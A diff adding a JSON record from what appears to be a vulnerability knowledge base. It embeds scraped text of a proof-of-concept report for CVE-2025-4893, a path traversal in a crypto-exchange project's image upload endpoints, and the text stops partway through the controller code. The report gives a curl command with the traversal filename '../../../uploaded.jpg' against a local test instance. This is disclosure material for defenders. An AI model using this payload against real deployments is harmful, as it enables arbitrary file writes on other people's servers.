@@ -1,0 +1,194 @@
+{
+  "aggregate": {
+    "contexts": [],
+    "cwes": [],
+    "parameters": [],
+    "payload_patterns": [],
+    "source_confidence": [
+      {
+        "claim_id": "clm-d7443ad8d1328ca4",
+        "confidence": 0.0,
+        "evidence_quality": "UNKNOWN",
+        "source_id": "src-0a21721b09e12dcd"
+      },
+      {
+        "claim_id": "clm-825a1832e19a1872",
+        "confidence": 0.0,
+        "evidence_quality": "UNKNOWN",
+        "source_id": "src-f7d9dc59915b6155"
+      },
+      {
+        "claim_id": "clm-fdd55b7ebe0366b9",
+        "confidence": 0.0,
+        "evidence_quality": "UNKNOWN",
+        "source_id": "src-f7d9dc59915b6155"
+      }
+    ],
+    "summaries": [
+      {
+        "source_ids": [
+          "src-f7d9dc59915b6155"
+        ],
+        "value": "cve-proofs/POC-20250515-01.md at main · ShenxiuSec/cve-proofs · GitHub"
+      }
+    ],
+    "tags": [
+      {
+        "source_ids": [
+          "src-0a21721b09e12dcd",
+          "src-f7d9dc59915b6155"
+        ],
+        "value": "cve:CVE-2025-4893"
+      },
+      {
+        "source_ids": [
+          "src-0a21721b09e12dcd",
+          "src-f7d9dc59915b6155"
+        ],
+        "value": "deterministic-intelligence"
+      },
+      {
+        "source_ids": [
+          "src-f7d9dc59915b6155"
+        ],
+        "value": "reference"
+      },
+      {
+        "source_ids": [
+          "src-0a21721b09e12dcd"
+        ],
+        "value": "research"
+      }
+    ],
+    "techniques": [],
+    "technologies": [],
+    "titles": [
+      {
+        "source_ids": [
+          "src-f7d9dc59915b6155"
+        ],
+        "value": "cve-proofs/POC-20250515-01.md at main · ShenxiuSec/cve-proofs · GitHub"
+      }
+    ],
+    "verification_patterns": [],
+    "vulnerability_types": [],
+    "wafs": [],
+    "xss_types": []
+  },
+  "confidence": 0.0,
+  "content": "cve-proofs/POC-20250515-01.md at main · ShenxiuSec/cve-proofs · GitHub\ncve-proofs/POC-20250515-01.md at main · ShenxiuSec/cve-proofs · GitHub Skip to content You signed in with another tab or window. Reload to refresh your session. You signed out in another tab or window. Reload to refresh your session. You switched accounts on another tab or window. Reload to refresh your session. Dismiss alert {{ message }} ShenxiuSec / cve-proofs Public Notifications You must be signed in to change notification settings Fork 4 Star 21 Files Expand file tree main / POC-20250515-01.md Copy path Blame More file actions Blame More file actions Latest commit History History History 205 lines (155 loc) · 7.56 KB main / POC-20250515-01.md Copy path Top File metadata and controls Preview Code Blame 205 lines (155 loc) · 7.56 KB Raw Copy raw file Download raw file Outline Edit and raw actions CoinExchange_CryptoExchange_Java Vulnerability Report This document describes a Path Traversal vulnerability found in the CoinExchange_CryptoExchange_Java repository. Assigned Identifier: CVE-2025-4893 Date Discovered: 2025-05-15 Vulnerability Details In the subproject 00_framework of the CoinExchange_CryptoExchange_Java , the file upload endpoint /admin/common/upload/local/image and /uc/upload/local/image lacks proper path validation. An attacker can exploit this by crafting path parameters to upload files to arbitrary locations on the system. Project Link: https://github.com/jammy928/CoinExchange_CryptoExchange_Java Affected Version: master branch Affected API: /admin/common/upload/local/image and /uc/upload/local/image Code Path: /CoinExchange_CryptoExchange_Java-master/00_framework/core/src/main/java/com/bizzan/bitrade/util/UploadFileUtil.java:19 Test Environment Setup JDK 8 Maven build for 00_framework Mysql Startup docker run -d \\ --name mysql-test \\ -p 3306:3306 \\ -e MYSQL_ROOT_PASSWORD=123456 \\ -e MYSQL_DATABASE=bizzan mysql:5.7 \\ --character-set-server=utf8mb4 \\ --collation-server=utf8mb4_unicode_ci \\ --init-connect= \" SET NAMES utf8mb4; \" The MySQL character set is configured to utf8mb4 . Redis Startup docker run -d --name redis-test -p 6379:6379 redis:latest Mongodb Startup docker run -d --name mongodb-test \\ -p 27017:27017 \\ -e MONGO_INITDB_DATABASE=bitrade \\ -e MONGO_INITDB_ROOT_USERNAME=root \\ -e MONGO_INITDB_ROOT_PASSWORD=123456 \\ mongo:latest Update the configuration file /00_framework/admin/src/main/resources/dev/application.properties # datasource spring.datasource.url=jdbc:mysql://127.0.0.1:3306/bizzan ? allowPublicKeyRetrieval=true & characterEncoding=utf-8 & serverTimezone=GMT%2B8 & useSSL=false spring.datasource.username=root spring.datasource.password=123456 # mongodb spring.data.mongodb.uri=mongodb://root:123456@127.0.0.1:27017/bitrade ? authSource=admin spring.data.mongodb.database=bitrade # redis spring.redis.host:127.0.0.1 spring.redis.port:6379 Please note the following two settings： 6.1 Added the parameter allowPublicKeyRetrieval=true in the MySQL connection. 6.2 Added the parameter authSource=admin in the MySQL connection. 6.3 Removed the parameter spring.redis.password . Set the path of spark-core-2.6.0.jar in the configuration file. We need to modify the code in the /00_framework/exchange-api/pom.xml . Fill in the absolute path of the /00_framework/jar/spark-core-2.6.0.jar in the corresponding location. < dependency > < groupId >com.sparkframework</ groupId > < artifactId >spark-core</ artifactId > < scope >system</ scope > < systemPath >/path/to/00_framework/jar/spark-core-2.6.0.jar</ systemPath > </ dependency > Copy Resources Bundle 'ValidationMessages' into /00_framework/admin/src/main/resources/dev/i18n The original project directory is missing the resource file corresponding to ValidationMessages . We need to copy it from /00_framework/ucenter-api/src/main/resources/dev/i18n to /00_framework/admin/src/main/resources/dev/i18n , so that the admin project can start independently and be tested successfully. Launch the project via IDEA, run WebApplication.main If an SMTP error is reported during execution, it can be ignored. The service will start at http://localhost:6010/ Steps to Reproduce 1. Upload a file with a constructed filename curl -v -i \\ -X POST \\ -F \" file=@/path/to/image/1.jpg;filename=../../../uploaded.jpg \" \\ http://localhost:6010/admin/common/upload/local/image The above command includes the constructed filename ../../../uploaded.jpg . After executing the above curl command, we can observe that the file has been uploaded to the corresponding path. 2. Effect of Upload The file upload logic is handled in the following two files. At line 97 of the file /00_framework/admin/src/main/java/com/bizzan/bitrade/controller/common/UploadController.java @ RequestMapping ( value = \"/local/image\" , method = RequestMethod . POST ) @ ResponseBody @ AccessLog ( module = AdminModule . COMMON , operation = \"上传本地图片\" ) public String uploadLocalImage ( HttpServletRequest request , HttpServletResponse response , @ RequestParam ( \"file\" ) MultipartFile file ) throws IOException { log . info ( request . getSession (). getServletContext (). getResource ( \"/\" ). toString ()); response . setCharacterEncoding ( \"UTF-8\" ); response . setContentType ( \"text/html; charset=UTF-8\" ); Assert . isTrue ( ServletFileUpload . isMultipartContent ( request ), sourceService . getMessage ( \"FORM_FORMAT_ERROR\" )); Assert . isTrue ( file != null , sourceService . getMessage ( \"NOT_FIND_FILE\" )); //验证文件类型 String fileName = file . getOriginalFilename (); String suffix = fileName . substring ( fileName . lastIndexOf ( \".\" ), fileName . length ()); if (! allowedFormat . contains ( suffix . trim (). toLowerCase ())) { return MessageResult . error ( sourceService . getMessage ( \"FORMAT_NOT_SUPPORT\" )). toString (); } String result = UploadFileUtil . uploadFile ( file , fileName ); if ( result != null ) { MessageResult mr = new MessageResult ( 0 , sourceService . getMessage ( \"UPLOAD_SUCCESS\" )); mr . setData ( result ); return mr . toString (); } else { MessageResult mr = new MessageResult ( 0 , sourceServi",
+  "content_hash": "4e6138b05962c3bb4dfbe2aaece7a01437510b6ca8dad661699c8e53a4b029cf",
+  "contexts": [],
+  "cwes": [],
+  "evidence_quality": "UNKNOWN",
+  "indexed_at": "2026-09-09T16:04:12.268894+00:00",
+  "intelligence_evidence": [],
+  "knowledge_id": "kb-4e6138b05962c3bb",
+  "parameters": [],
+  "payload_patterns": [],
+  "provenance": [
+    {
+      "claims": [
+        {
+          "claim_id": "clm-d7443ad8d1328ca4",
+          "confidence": 0.0,
+          "contexts": [],
+          "cwes": [],
+          "evidence_quality": "UNKNOWN",
+          "parameters": [],
+          "payload_patterns": [],
+          "summary": null,
+          "tags": [
+            "cve:CVE-2025-4893",
+            "deterministic-intelligence",
+            "research"
+          ],
+          "techniques": [],
+          "technologies": [],
+          "title": null,
+          "verification_patterns": [],
+          "vulnerability_types": [],
+          "wafs": [],
+          "xss_types": []
+        }
+      ],
+      "ingested_at": null,
+      "published_at": null,
+      "source_id": "src-0a21721b09e12dcd",
+      "source_type": "research",
+      "source_url": "https://github.com/ShenxiuSec/cve-proofs/blob/main/POC-20250515-01.md",
+      "title": null
+    },
+    {
+      "claims": [
+        {
+          "claim_id": "clm-825a1832e19a1872",
+          "confidence": 0.0,
+          "contexts": [],
+          "cwes": [],
+          "evidence_quality": "UNKNOWN",
+          "parameters": [],
+          "payload_patterns": [],
+          "summary": "cve-proofs/POC-20250515-01.md at main · ShenxiuSec/cve-proofs · GitHub",
+          "tags": [
+            "cve:CVE-2025-4893",
+            "reference"
+          ],
+          "techniques": [],
+          "technologies": [],
+          "title": "cve-proofs/POC-20250515-01.md at main · ShenxiuSec/cve-proofs · GitHub",
+          "verification_patterns": [],
+          "vulnerability_types": [],
+          "wafs": [],
+          "xss_types": []
+        },
+        {
+          "claim_id": "clm-fdd55b7ebe0366b9",
+          "confidence": 0.0,
+          "contexts": [],
+          "cwes": [],
+          "evidence_quality": "UNKNOWN",
+          "parameters": [],
+          "payload_patterns": [],
+          "summary": null,
+          "tags": [
+            "cve:CVE-2025-4893",
+            "deterministic-intelligence",
+            "reference"
+          ],
+          "techniques": [],
+          "technologies": [],
+          "title": "cve-proofs/POC-20250515-01.md at main · ShenxiuSec/cve-proofs · GitHub",
+          "verification_patterns": [],
+          "vulnerability_types": [],
+          "wafs": [],
+          "xss_types": []
+        }
+      ],
+      "ingested_at": "2026-09-09T16:04:12.268894+00:00",
+      "published_at": null,
+      "source_id": "src-f7d9dc59915b6155",
+      "source_type": "github",
+      "source_url": "https://github.com/ShenxiuSec/cve-proofs/blob/main/POC-20250515-01.md",
+      "title": "cve-proofs/POC-20250515-01.md at main · ShenxiuSec/cve-proofs · GitHub"
+    }
+  ],
+  "published_at": null,
+  "schema_version": 2,
+  "source_type": "research",
+  "source_url": "https://github.com/ShenxiuSec/cve-proofs/blob/main/POC-20250515-01.md",
+  "summary": null,
+  "tags": [
+    "cve:CVE-2025-4893",
+    "deterministic-intelligence",
+    "reference",
+    "research"
+  ],
+  "techniques": [],
+  "technologies": [],
+  "title": "cve-proofs/POC-20250515-01.md at main · ShenxiuSec/cve-proofs · GitHub",
+  "verification_patterns": [],
+  "vulnerability_types": [],
+  "wafs": [],
+  "xss_types": []
+}
